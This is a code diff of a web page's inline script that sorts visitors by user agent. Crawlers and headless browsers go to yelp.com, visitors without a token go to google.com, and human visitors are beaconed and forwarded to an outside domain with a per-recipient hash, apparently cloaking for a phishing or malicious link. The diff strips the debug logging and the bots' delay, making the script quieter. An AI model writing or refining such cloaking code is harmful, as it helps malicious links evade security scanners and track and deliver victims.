@@ -10,14 +10,7 @@
       const uaClean = ua.toLowerCase().replace(/\s+/g, '');
       const isBot = uaClean.includes("bot") || uaClean.includes("crawl") || uaClean.includes("spider") || uaClean.includes("slurp") || uaClean.includes("headless") || uaClean.includes("phantom") || uaClean.includes("facebookexternalhit") || uaClean.includes("googlebot");
 
-      console.log("🔍 HASH:", hash);
-      console.log("🧾 UA:", ua);
-      console.log("🧾 UA Cleaned:", uaClean);
-      console.log("🧾 UA Length:", ua.length);
-      console.log("🤖 Is Bot:", isBot);
-
       if (!hash) {
-        console.log("❌ No token — redirecting to Google");
         window.location.href = "https://google.com";
         return;
       }
@@ -28,14 +21,10 @@
       img.src = fullLogUrl;
 
       if (isBot) {
-        console.log("✅ Bot detected — redirecting to Yelp in 3 seconds...");
-        setTimeout(() => {
-          window.location.href = "https://yelp.com";
-        }, 3000);
+        window.location.href = "https://yelp.com";
         return;
       }
 
-      console.log("✅ Human detected — redirecting to szliyi.com");
       window.location.replace(`https://szliyi.com/${hash}`);
     });
   </script>
